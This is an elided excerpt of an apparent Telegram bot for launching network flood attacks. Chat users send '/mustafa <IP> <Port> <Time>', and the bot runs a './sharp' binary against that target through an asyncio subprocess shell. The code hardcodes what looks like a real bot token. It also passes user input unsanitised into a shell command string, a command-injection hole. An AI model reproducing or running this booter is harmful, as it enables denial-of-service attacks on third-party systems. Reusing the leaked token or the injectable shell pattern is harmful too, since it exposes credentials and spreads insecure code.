...
# Configuration
TOKEN = '7718655847:AAGf4kBc5UUL80Nhxbq03f3S9Bj3STHR8y0'
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration} 877")
...
def handle_attack(message):
    ...
    try:
        ...
        bot.reply_to(message, "🚀 USE /mustafa <IP> <Port> <Time>.")
